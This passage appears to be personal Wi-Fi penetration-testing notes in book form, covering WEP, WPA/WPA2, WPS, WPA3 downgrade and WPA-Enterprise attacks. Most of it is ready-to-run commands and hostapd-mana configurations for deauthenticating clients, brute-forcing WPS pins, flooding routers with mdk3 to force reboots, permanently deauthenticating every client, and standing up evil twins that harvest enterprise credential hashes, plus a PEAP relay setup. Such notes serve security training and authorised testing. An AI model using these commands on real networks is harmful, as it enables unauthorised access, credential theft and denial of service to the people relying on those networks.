+<p><code>preferences &gt; protocols &gt; IEEE 802.11</code>, check "enable decryption", edit the decryption keys y create new entries. For WEP, use the key in hex format.`</p>
+<p>If we don't have wireshark we can do:</p>
+<pre><code class="language-bash">airdecap-ng -w &lt;wep key in hex&gt; &lt;pcap&gt;
+tshark -r &lt;decrypted pcap&gt;
+</code></pre>
+<h3 id="ap-less-attacks-caffe-latte-attack"><a class="header" href="#ap-less-attacks-caffe-latte-attack">AP-less attacks: Caffe latte attack</a></h3>
+<p>We can craft packets by modifying the ICV (integrity check value, that is, a CRC) and the plantext of a message and do so in a way that the AP thinks that the message is legitimate.</p>
+<p>With this we can modify a Gratuitous ARP packet and change it to an ARP request packet, to repeat the ARP attack</p>
+<p>Client devices store the keys of the networks they already connected to in the past. If we create a fake AP that looks like on of the stored APs in the client PNL, he will connect to us and send WEP-encrypted data with the target AP key. Sometimes it sends also Gratuitous ARP packets, to say its IP and MAC
+In these messages we won't find the target MAC, and the target IP and sender IP are the same (that of the client). We as an AP send requests to the client, and he will return responses to us, from where we get valid IVs that can be cracked as always.</p>
+<p>We don't have a valid WEP keys for the crafted packets, but due to the properties of XOR we can modify the packets that he sends us, and they will still be valid.</p>
+<h4 id="hirte-attack"><a class="header" href="#hirte-attack">Hirte attack</a></h4>
+<p>AP-less attack</p>
+<pre><code class="language-bash"># create fake AP (-N for hirte attack)
+airbase-ng -c 1 --essid "network1" -W 1 -N mon0
+
+# capture packets
+airodump-ng -c 1 mon0 --write Hirte
+
+# wait for the client to connect, and ARP packets should start being replayed, 
+</code></pre>
+<h3 id="wep-cloacking"><a class="header" href="#wep-cloacking">WEP cloacking</a></h3>
+<p>WEP protection in which fake packets are sent into the air to make it difficult to crack WEP (they try to difficult the statistical attacks)</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-6---wpa"><a class="header" href="#chapter-6---wpa">Chapter 6 - WPA</a></h1>
+<h2 id="wpawpa2-1"><a class="header" href="#wpawpa2-1">WPA/WPA2</a></h2>
+<p>https://www.youtube.com/watch?v=Ra0dGPYScLQ</p>
+<h2 id="quick-notes-2"><a class="header" href="#quick-notes-2">Quick Notes</a></h2>
+<pre><code>
+## Cracking with Aircrack-ng
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                        ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;      ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                        ## performing a deauthentication attack against AP to capture the handshake packet
+   aircrack-ng -w &lt;wordlist&gt; &lt;capture_file&gt;                                        ## cracking WPA password with aircrack-ng
+   
+   
+## Cracking with JTR and Aircrack-ng
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                                       ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;                     ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                                       ## performing a deauthentication attack against AP to capture the handshake packet
+   ./john --wordlist=&lt;wordlist&gt; --rules --stdout | aircrack-ng -e &lt;ESSID&gt; -w - &lt;capture_file&gt;     ## cracking WPA password with JTR and aircrack-ng 
+  
+  
+## Cracking with coWPAtty
+  
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; &lt;interface&gt;       ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                         ## performing a deauthentication attack against AP to capture the handshake packet
+   cowpatty -r &lt;capture_file&gt; -f &lt;wordlist&gt; -2 -s &lt;ESSID&gt;                           ## cracking WPA password with coWPAtty in dictionary mode
+   or
+   genpmk -f &lt;wordlist&gt; -d &lt;hashes_file&gt; -s &lt;ESSID&gt;                                 ## generating hashes to crack WPA password in coWPAtty with rainbow table mode
+   cowpatty -r &lt;capture&gt; -d &lt;hashes_file&gt; -2 -s &lt;ESSID&gt;                             ## cracking WPA password with coWPAtty using generated hashes
+ 
+  
+## Cracking with Pyrit
+
+   airmon-ng start &lt;interface&gt; &lt;AP_Channel&gt;                                  ## setting the wireless card (wlan0) to monitor mode
+   pyrit -r &lt;interface&gt; -o &lt;capture_file&gt; stripLive                          ## using pyrit to sniff in monitor mode interface by saving the capture process to a file
+   aireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;                  ## performing a deauthentication attack against AP to capture the handshake packet
+   pyrit -r &lt;capture_file&gt; -i &lt;wordlist&gt; -b &lt;AP_MAC&gt; attack_passthrough      ## cracking WPA password with pyrit in dictionary mode
+   or
+   pyrit -i &lt;wordlist&gt; import_passwords                                      ## import word list to crack WPA password in pyrit with database mode                         
+   pyrit -e &lt;ESSID&gt; create_essid                                             ## adding the ESSID of the access point to the pyrit database
+   pyrit batch                                                               ## creating PMKs for ESSID
+   pyrit -r &lt;capture_file&gt; -b &lt;AP_MAC&gt; attack_db                             ## cracking WPA password in database mode with pyrit
+   
+   
+</code></pre>
+<p>Before trying to crack WPA find out if WPS is enabled, which is easier to crack</p>
+<h3 id="wps"><a class="header" href="#wps">WPS</a></h3>
+<p>Method to authenticate to WPA without the passphrase, only with a 8 character ping. It can be cracked faster because of its length, and once obtained, the WPA/WPA2 passphrase can be automatically recovered.</p>
+<p>Requirements (hard to find nowadays)</p>
+<ul>
+<li>WPS must be enabled</li>
+<li>WPS must be using <code>pin authentication</code> and not PBC (Push Button Configuration). With option, a physical button in the router must be pushed to activate the use of WPS for some time interval. PBC usually is active by default in modern routers, or WPS is directly disabled by default.</li>
+</ul>
+<pre><code class="language-bash"># Find APs with WPS activated (exit with ctrl-C)
+wash --interface wlan0mon  
+wash -i wlan0mon  
+# scan 5GHz band
+wash -i wlan0mon -5
+# The Lck column says if WPS is locked (sometimes WPS gets locked after some failed attempts). WPS version 2 includes mitigations against brute force, but depending on the implementation it may only slow it down.
+
+# The next command brute forces WPS pins, online cracking similar to hydra (-vvv for verbose, --no-associate if we have previously associated with aireplay-ng --fakeauth)
+reaver -b &lt;AP bssid&gt; -i wlan0mon -v
+reaver --bssid &lt;AP bssid&gt; --channel &lt;AP channel&gt; --interface wlan0mon -vvv --no-associate
+
+# Pixie attack (-K), faster than the regular brute force, but doesn't always work, depends on the AP PRGA 
+reaver -b &lt;AP BSSID&gt; -i wlan0mon -v -K
+
+# When the previous command is sent it stays waiting if we are not associated with the AP. We can do it with aireplay, so that the AP doesn't ignore the future packets that we will send (instead of 0 we can use a certain number of seconds to be associated)
+sudo aireplay-ng --fakeauth 30 -a &lt;AP bssid&gt; -h &lt;our own MAC&gt; wlan0mon
+</code></pre>
+<p>Reaver outputs the WPS pin if it can find it, and thanks to it it also retrieves the passphrase (WPA-PSK), which we can use to connect to the network. Even if it finds it, it's an slow attack, it can take a few hours to complete, depending on the router AP configuration and the value of the pin (if it's one of the last ones reaver tries)</p>
+<p>These attacks usually fail, there are several possible sources of problems. Reaver can say that the AP is deauthenticating us, among other error messages. If WPS cracking doesn't work right away it probably won't work at all. Even if an AP's WPS is not locked the attacks can fail for other reasons. For example, some routers timeout WPS after a short time since it was activated.</p>
+<p>There are APs that don't use a pin. With bully and reaver we can use the <code>-p ''</code> option to check if the pin is empty</p>
+<p>Some APs use a pin that is linked to the first three bytes of the BSSID. Airgeddon contains them in known_pins.db</p>
+<p>To check if a certain BSSID has known default pins, use the first three bytes of the AP (without the colon symbols, in this case XXYYZ for a BSSID= XX:YY:ZZ:AA:BB:CC)</p>
+<pre><code>source /usr/share/airgeddon/known_pins.db
+echo ${PINDB["XXYYZZ"]}
+14755989 48703970 06017637
+</code></pre>
+<p>Try manually the pins returned, if any</p>
+<p>troubleshooting the reaver:
+1- If it says it cannot associate with the AP -&gt; we need to associate manually with aireplay-ng --fakeauth in another terminal, and keep the fake auth running while we try the reaver attack (which we must run with the -A option, so that it doesn't try to associate itself to the AP, since we already are associated via aireplay-ng)</p>
+<p>2- Reaver says WPS transaction failed, re-trying last ping (we can see this with -vvv for debugging output). Then it retries the same pin all the time. Sometimes (we can see in the output) this is due to the use of NACK packets. We can try with the option -N (or --no-nacks) to not send them.</p>
+<p>3- If reaver says "Waiting for beacon from XX:XX:XX:XX:XX:XX" we need to specify the channel manually (-c parameter)</p>
+<p>4- The AP can have rate limiting enabled, and change state to locked (Lck) after some failed attempts. If we suspect the AP locked WPS, run <code>wash</code> again to check if it's in the Lck state. We can deauthenticate permanently all clients connected, so that someone complains or restarts the AP, so that we can continue bruteforcing pins. This is very clumsy and noisy, and if the rate limiting occurs fast it's probably going to be useless, as we will quickly lock WPS again.
+We can run this "permanent" deauth with
+<code>sudo aireplay-ng --deauth 1000000000000 -a &lt;AP bssid&gt; wlan0mon</code></p>
+<p>We can also try the <code>mdk3</code> tool, which can cause DoS to some routers and perhaps force them to restart. Some routers unlock WPS when they restart</p>
+<pre><code class="language-bash"># DoS to an AP, with different MACs, as if it were a DDoS. Some routers reboot when too many different MACs try to connect to them because they cannot handle so many connections
+
+# Help of the "a" option of mdk3 (used for DoS) withs
+mdk3 --help a 
+
+# DoS (-m for using real looking MACs, not arbitrary ones like 00:00:00:00:00:00)
+mdk3 wlan0mon a -a &lt;AP BSSID&gt; -m
+</code></pre>
+<p>Clients connect in amounts of 500 and it may say that it is vulnerable, or it may not say it. When we reach about 10000 stop <code>mdk3</code> and use <code>wash</code> to check if WPS got unlocked (if the AP rebooted it will take a while before we can get useful output from <code>wash</code>)</p>
+<ul>
+<li>karma attack: the fake AP listens to probes sent by clients when they search for known APs and responds, telling them that he is the AP they are looking for</li>
+</ul>
+<h3 id="wpawpa2-cracking"><a class="header" href="#wpawpa2-cracking">WPA/WPA2 cracking</a></h3>
+<p>WPA-&gt; TKIP (based on WEP). WPA only required firmware update, for that reason it was accepted quickly
+WPA2 -&gt; CCMP (based on AES). WPA2 needs new hardware to compute AES faster</p>
+<pre><code class="language-bash"># Run the following and wait for a handshake by a new client connecting to the network
+sudo airodump-ng --bssid &lt;AP bssid&gt; --channel &lt;channel&gt; --write &lt;cap file&gt; wlan0mon
+
+# We can also deauthenticate a client to force him to reconnect (we should see in the top right corner of the airodump-ng output tha ta handshake has been captured. I have problems with this in a VM, but not on a baremetal linux)
+sudo aireplay-ng --deauth 4 -a &lt;AP bssid&gt; -c &lt;client MAC&gt; wlan0mon
+
+# Crack the capture file
+aircrack-ng &lt;file.cap&gt; -w &lt;wordlist.txt&gt;
+</code></pre>
+<p>Cracking is time consuming because of the computation of the PBKDF2 function (4096 iterations for AES). A rainbow table can be precomputed:</p>
+<p><code>genpmk -f &lt;wordlist&gt; -d precomputed-common -s home</code>
+And we can crack with a rainbow table attack:
+<code>cowpatty -d &lt;precomputed wordlist&gt; -s &lt;ESSID&gt; -r &lt;capture file.cap&gt;</code></p>
+<pre><code class="language-bash"># Create the &lt;output db&gt; database 
+airolib-ng &lt;output db&gt; --import passwd &lt;wordlist&gt;
+
+# save to a file the ESSID that we want to crack
+echo "&lt;essid&gt;" &gt; &lt;essid file&gt;
+
+# Import the ESSID in the DB
+airolib-ng &lt;output db&gt; --import essid &lt;essid file&gt;
+
+# Create a PMK for every password in the list
+airolib-ng &lt;output db&gt; --batch
+
+# Crack
+aircrack-ng -r &lt;output db&gt; &lt;file.cap&gt;
+</code></pre>
+<h3 id="ap-less-networks"><a class="header" href="#ap-less-networks">AP-less networks</a></h3>
+<p>If we see a client probing for a network but the network is not there, probably it's using WPA/WPA2, we can create a honeypot with that network name and capture traffic with airodump, so that when he tries to connect to us we capture a handshake that we can try to crack</p>
+<h3 id="wpa3"><a class="header" href="#wpa3">WPA3</a></h3>
+<p>It is not possible to crack WPA3. But we can try downgrade clients to WPA2 to capture a crackable handshake. This can be done with an evil twin with only WPA2 and 802.11w set to "optional".</p>
+<p>If 802.11w is disabled, a client may never try to connect, but WPA2 clients rarely use it (and sometimes don't handle it well). The combination of only using WPA2 and 802.11w set to "optional" will gives us the highest chance that a client will be willing to downgrade.</p>
+<p>To achieve this in the hostapd configuration:
+- <em>wpa</em> value should be set to "2"</p>
+<ul>
+<li>there shouldn't be a <em>wpa_pairwise</em> parameter</li>
+<li>rsn_pairwise should be set to "CCMP" only</li>
+<li>To enable 802.11w, we would set <em>ieee80211w</em> as a new parameter with the value of "1" (indicating it is optional).</li>
+<li>The latter also requires that we add "WPA-PSK-SHA256" to <em>wpa_key_mgmt</em>.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-7---wpa-enterprise"><a class="header" href="#chapter-7---wpa-enterprise">Chapter 7 - WPA Enterprise</a></h1>
+<h3 id="wpa-enterprise-2"><a class="header" href="#wpa-enterprise-2">WPA enterprise</a></h3>
+<p>Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. Connection in windows:</p>
+<p>Looks like a captive portal but it's safer. In WPA enterprise we attack the clients, not the AP nor the RADIUS</p>
+<p>Companies usually create their own CA to validate their certificates and make our forged certificates fail. For that they need to install a company certificate in every client</p>
+<p>EAP-TTLS -&gt; server authenicates with certificate. Client can optionally use certificate. There are versions EAP-TTLSv0 and EAP-TTLSv1. Inner auth methods: PAP, CHAP, MSCHAP, MSCHAPv2</p>
+<p>PEAP vs TTLS:
+EAP-TTLS has option to use client side certificate
+EAP-TTLS-PAP support (cleartext passord)
+EAP-PEAP is a wrapper around EAP carring the EAP for authenication
+TTLS is a wrapper around TLVs (type length values), which are RADIUS attributes</p>
+<p>The server gives to the client a certificate, to make sure that the client sends credentials to a trusted server</p>
+<h3 id="eap"><a class="header" href="#eap">EAP</a></h3>
+<p>WPA-Enterprise, authentication via a RADIUS server, not on the AP</p>
+<p>We can host a RADIUS server with freeradius to handle authentication and hostap with custom certificates to create en evil twin of a WPA-Enterprise network</p>
+<h3 id="eap-radius"><a class="header" href="#eap-radius">EAP (RADIUS)</a></h3>
+<p>WPA Enterprise uses Extensible Authentication Protocol (EAP). EAP is a framework for authentication, which allows a number of different authentication schemes or methods.</p>
+<p>Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server. The client authenticates using a number of EAP frames, depending on the agreed upon authentication scheme, which are relayed by the AP to the RADIUS server. If authentication is successful, the result is then used as Pairwise Master Key (PMK) for the 4-way handshake, as opposed to PSK, where the passphrase is derived to generate the PMK.</p>
+<p>Authentication to a RADIUS server with most common EAP methods, requires the use of certificates on the server side at the very least. Some older, now deprecated EAP methods don't require certificates. Although a number of authentication schemes are possible, just some of them are commonly used, due to their security, and integration with existing OS. It is common to use a username and password to authenticate, which could be tied to domain credentials.</p>
+<p>We'll go over a few EAPs commonly used on Wi-Fi networks.</p>
+<h4 id="eap-tls"><a class="header" href="#eap-tls">EAP-TLS</a></h4>
+<p>EAP Transport Layer Security (EAP-TLS) is one of the most secure authentication methods, as it uses certificates on the server side and client side, instead of login and passwords, so the client and server mutually authenticate each other.</p>
+<h4 id="eap-ttls"><a class="header" href="#eap-ttls">EAP-TTLS</a></h4>
+<p>EAP Tunneled Transport Layer Security (EAP-TTLS), as the name suggests, also uses TLS. As opposed to EAP-TLS, it does not necessarily need client certificates. It creates a tunnel and then exchanges the credentials using one of the few possible different inner methods (also called <strong>phase 2</strong>), such as Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CHAP), or MS-CHAPv2.</p>
+<h4 id="peap-ms-chapv2-and-others"><a class="header" href="#peap-ms-chapv2-and-others">PEAP (MS-CHAPv2 and others)</a></h4>
+<p>Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP) also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method.</p>
+<p>PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.</p>
+<p>PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hashcat</p>
+<h3 id="attack"><a class="header" href="#attack">Attack</a></h3>
+<p>The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.</p>
+<h3 id="optional-imitating-the-server-certificates"><a class="header" href="#optional-imitating-the-server-certificates">Optional: imitating the server certificates</a></h3>
+<p>While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.</p>
+<p><font color=red>if no certificates are captured when the client reauthenticates, deauthenticate him again</font></p>
+<p>We can check the validity by using <code>openssl x509 -in CERT_FILENAME -noout -enddate</code> where <strong>CERT_FILENAME</strong> is the .pem or .crt file.</p>
+<p>We can now disable monitor mode</p>
+<p>wireshark filter for packets with certificate: <code>tls.handshake.certificate</code>  [[8 - wireshark#Tshark]]</p>
+<p>With wireshark -&gt; Packet Details &gt; Extensible Authentication Protocol &gt; Transport Layer Security &gt; TLSv1 Record Layer: Handshake Protocol: Certificate &gt; Handshake Protocol: Certificate &gt; Certificates &gt; Certificate. For each of them, right click &gt; Export Packet Bytes. Alternatively, check with [[8 - wireshark#Tshark]]</p>
+<p>install freeradius</p>
+<pre><code>sudo apt install freeradius
+</code></pre>
+<p>Modify in folder /etc/freeradius/3.0/certs the files ca.cnf (certificate_authority section) and server.cnf (server section).</p>
+<p>Run the following to regenerate diffie hellman with a 2048 bit key and create the certificates</p>
+<pre><code># in /etc/freeradius/3.0/certs folder:
+rm dh
+make
+</code></pre>
+<p>The client error during the make command can be ignored, it's not necessary to create client certificates to get their hashes when they connect to us.</p>
+<p>Run the command <code>make destroycerts</code> if you had previously created certificates, to start anew</p>
+<p>If you don't have it, install hostapd-mana to create the fake Access Point:
+<code>sudo apt install hostapd-mana</code></p>
+<p>Also create the file <code>/etc/hostapd-mana/mana.eap_user</code>. Add the following contents to increase the chances of clients being able to connect to our fake AP</p>
+<pre><code>*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+</code></pre>
+<h3 id="hostapd-mana-for-wpa-enterprise"><a class="header" href="#hostapd-mana-for-wpa-enterprise">hostapd-mana for wpa-enterprise</a></h3>
+<p>TIPS:</p>
+<ul>
+<li>For testing you may need to change your client settings and turn off and on the wifi, while hostapd-mana remains running all the time, capturing creentials when connection attempts happen, and only if the configuration of the client is the right one for hostapd-mana to get hashes or credentials (EAP connections). at times hostapd-mana may behave strangely after many failed connections, just rerun it, but remember that most of the tweaking happens on the client when messing with the configuration, or if we want to generate traffic, just keep hostapd-mana running and turn off and on wifi on the client after changing the config.</li>
+<li>The channel doesn't matter, but if we use the same as the original it's easier to monitor both networks at once with airodump</li>
+<li>Disable monitor mode to host an AP with hostapd-mana</li>
+<li>If we don't clone the BSSID the channel we use doesn't matter, but if we clone it, we must use a different channel to avoid errors</li>
+<li>mana adds functions that hostapd doesn't have</li>
+</ul>
+<h4 id="options-in-the-configuration-files-of-hostapd-mana"><a class="header" href="#options-in-the-configuration-files-of-hostapd-mana">Options in the configuration files of hostapd-mana</a></h4>
+<ul>
+<li>mana_wpe=1 -&gt; to sniff credentials</li>
+<li>mana_eapsuccess=1 -&gt; To let the victim know that he was successful when connecting to us</li>
+<li>mana_credout=<code>&lt;file&gt;</code> -&gt; Saves creds to a file</li>
+<li>eap_server=1 -&gt; Use the internal EAP server, not an external one</li>
+<li>enable_mana=1 -&gt; karma attack, respond to every client that tries to connect to us, making him believe that we are the SSID that he is probing</li>
+</ul>
+<pre><code>interface=wlan1
+ssid=&lt;ESSID&gt;
+hw_mode=g
+channel=6
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+mana_credout=hostapd.creds
+</code></pre>
+<p>host evil twin with
+<code>hostapd_mana mana.conf</code></p>
+<h4 id="attack-peap-gtc"><a class="header" href="#attack-peap-gtc">Attack PEAP-GTC</a></h4>
+<pre><code>interface=wlan1
+ssid=&lt;target ESSID&gt;
+channel=6
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+auth_algs=3
+ieee8021x=1
+eapol_key_index_workaround=0
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+private_key_passwd=
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+</code></pre>
+<p>karma attack-&gt; So that many clients can connect to us simultaneously</p>
+<pre><code>interface=wlan1
+ssid=&lt;target ESSID&gt;
+channel=6
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+auth_algs=3
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+enable_mana=1
+mana_credout=hostapd.creds
+</code></pre>
+<p>hostapd-mana returns strings to crack WPA-EAP in the following formats
+- asleap
+- john
+- hashcat
+I have found that sometimes one tool isn't able to crack it and other is (WTF?) so if one doesn't find the password try with other and the same dictionary</p>
+<h3 id="peap-relay-attack"><a class="header" href="#peap-relay-attack">PEAP relay attack</a></h3>
+<p>More info:
+https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/
+https://www.youtube.com/watch?v=3FSLM1VY0SQ
+https://www.youtube.com/watch?v=XYgBw8mx9Jw</p>
+<p>3 interfaces are needed:</p>
+<ul>
+<li>wlan0 for hostapd-mana</li>
+<li>wlan1 for sycophant</li>
+<li>wlan2 recon and for deauthenticating clients</li>
+</ul>
+<h4 id="wlan0"><a class="header" href="#wlan0">wlan0</a></h4>
+<p>file for hostapd-mana:</p>
+<pre><code>interface=wlan0
+ssid=&lt;target ESSID&gt;
+channel=6
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+auth_algs=3
+ieee8021x=1
+eapol_key_index_workaround=0
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+private_key_passwd=
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+enable_mana=1
+enable_sycophant=1
+sycophant_dir=/tmp/
+</code></pre>
+<p>Run hostapd:
+<code>hostapd-mana ap.conf</code></p>
+<h4 id="wlan1"><a class="header" href="#wlan1">wlan1</a></h4>
+<p>sycophant configuration file:</p>
+<pre><code>network={
+ssid="&lt;target ESSID&gt;"
+# The SSID you would like to relay and authenticate against.
+scan_ssid=1
+key_mgmt=WPA-EAP
+# Do not modify
+identity=""
+anonymous_identity=""
+password=""
+# This initialises the variables for me.
+# -------------
+eap=PEAP
+phase1="crypto_binding=0 peaplabel=0"
+phase2="auth=MSCHAPV2"
+# Dont want to connect back to ourselves,
+# so add your rogue BSSID here.
+bssid_blacklist=&lt;hostapd-mana MAC&gt;
+}
+</code></pre>
+<p>In the last line we use the MAC of the interface with hostapd-mana (wlan0 in this case)</p>
+<p>Run with
+<code>./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan1</code></p>
+<h4 id="wlan2"><a class="header" href="#wlan2">wlan2</a></h4>
+<p>Deauth a client connected to the target network so that it (hopefully) connects to our rogue AP, which will relay traffic to sycophant
+<code>aireplay-ng -0 4 -a &lt;target BSSID&gt; -c &lt;target client MAC&gt; wlan2</code></p>
+<p>We should see the connection in sycophant if everything goes well, and then in wlan2 we can do the following to get an IP
+<code>dhclient -v wlan1</code></p>
+<h3 id="eaphammer"><a class="header" href="#eaphammer">EAPhammer:</a></h3>
+<p>Tool to create fake APs</p>
+<pre><code class="language-bash">./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds
+
+# karma attack, make every client believe that we are the AP(s) that he is probing. The difference between karma attack and evil twin is that karma uses the probe requests sent by clients (from their preferred network list, PNL) and in evil twin we must guess the APs they want to connect to
+./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds --karma
+</code></pre>
+<h3 id="eap-md5-crack"><a class="header" href="#eap-md5-crack">EAP MD5 crack</a></h3>
+<p><code>./eapmd5pass -w dict -r eapmd5-sample.dump</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-8---rogue-ap"><a class="header" href="#chapter-8---rogue-ap">Chapter 8 - Rogue AP</a></h1>
+<h2 id="creating-a-rogue-ap"><a class="header" href="#creating-a-rogue-ap">Creating a Rogue AP</a></h2>
+<p>Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.</p>
+<p>If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.</p>
+<p><font color=red>with hostapd, we need to be listening with airodump (on another wifi interface) at the same time that we host the fake ap, to capture handshakes of clients that try to connect to us, despite the PSK mismatch (since we don't know the real PSK but will crack it from their handshake to us)</font></p>
+<p>Deauth a client if he doesn't connect to our AP
+<code>sudo aireplay-ng --deauth 4 -a &lt;bssid&gt; -c &lt;client_MAC&gt; wlan0mon</code></p>
+<h3 id="hostapd--hostapd-mana"><a class="header" href="#hostapd--hostapd-mana">hostapd / hostapd-mana</a></h3>
+<p>hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options</p>
+<p>Install</p>
+<pre><code class="language-bash">sudo apt install hostapd-mana
+sudo apt install hostapd-mana
+</code></pre>
+<p>Run</p>
+<pre><code class="language-bash">hostapd a.conf
+hostapd-mana a.conf
+</code></pre>
+<p>Parameters:</p>
+<ul>
+<li><code>driver=nl80211</code>  -&gt; always the same for all linux devices</li>
+<li><code>hw_mode=g</code> -&gt; 2.4 GHz  y 54 Mb</li>
+<li>auth_algs (this is for WEP, for WPA use the equivalent <code>wpa</code> parameter-&gt;
+<ul>
+<li><code>auth_algs=0</code> -&gt;OPEN</li>
+<li><code>auth_algs=1</code> -&gt;WEP</li>
+<li><code>auth_algs=2</code> -&gt; Both</li>
+</ul>
+</li>
+<li><code>wep_key0</code> &lt;- we can use up to 4</li>
+<li>Type of security
+<ul>
+<li><code>wpa=3</code> -&gt; activate both WPA and WPA2</li>
+<li><code>wpa=2</code> -&gt; activate only WPA2</li>
+<li><code>wpa=1</code> -&gt; activate only WPA</li>
+</ul>
+</li>
+</ul>
+<p>Type of authentication:</p>
+<ul>
+<li><code>wpa_key_mgmt=WPA-PSK</code></li>
+<li><code>wpa_passphrase=&lt;passphrase&gt;</code> -&gt; passphrase in the case of PSK auth, we can set anything here, we don't care it's wrong</li>
+</ul>
+<p>Encryption type (if the target is exclusiveliy WPA1 or WPA2 use just one of the following):</p>
+<ul>
+<li><code>wpa_pairwise=TKIP CCMP</code> -&gt; TKIP or CCMP encryption with WAP1</li>
+<li><code>rsn_pairwise=TKIP CCMP</code> -&gt; TKIP or CCMP encryption with WPA2</li>
+</ul>
+<p>- <code>mana_wpaout</code>-&gt; where to save the captured handshakes (in a Hashcat hccapx format).</p>
+<h4 id="hostap-with--no-encryption"><a class="header" href="#hostap-with--no-encryption">hostap with  no encryption</a></h4>
+<pre><code>interface=wlan1
+ssid=hostel-A
+hw_mode=g
+channel=6
+driver=nl80211
+</code></pre>
+<h4 id="hostap-with-wep"><a class="header" href="#hostap-with-wep">hostap with wep</a></h4>
+<pre><code>interface=wlan1
+hw_mode=g
+channel=6
+driver=nl80211
+ssid=hostel-A
+auth_algs=1
+wep_default_key=0
+wep_key0="54321"
+</code></pre>
+<h4 id="hostap-with-wpa-psk"><a class="header" href="#hostap-with-wpa-psk">hostap with WPA-PSK</a></h4>
+<pre><code>interface=wlan1
+hw_mode=g
+channel=6
+driver=nl80211
+ssid=HomeAlone
+auth_algs=1
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+wpa_passphrase=welcome@123
+</code></pre>
+<h4 id="hostap-with-wpa2-psk"><a class="header" href="#hostap-with-wpa2-psk">hostap with WPA2-PSK</a></h4>
+<pre><code>interface=wlan1
+hw_mode=g
+channel=6
+driver=nl80211
+ssid=Lost-in-space
+auth_algs=1
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+wpa_passphrase=beautifulsoup
+
+# SSID 2
+bss=wlan1_0
+ssid=LOCOMO-Mobile-hotspot
+auth_algs=1
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+wpa_passphrase=beautifulsoup
+</code></pre>
+<p>alternative</p>
+<pre><code>interface=wlan1
+hw_mode=g
+channel=6
+driver=nl80211
+
+ssid=Lost-in-space
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=beautifulsoup
+</code></pre>
+<h4 id="hosting-several-aps"><a class="header" href="#hosting-several-aps">Hosting several APs</a></h4>
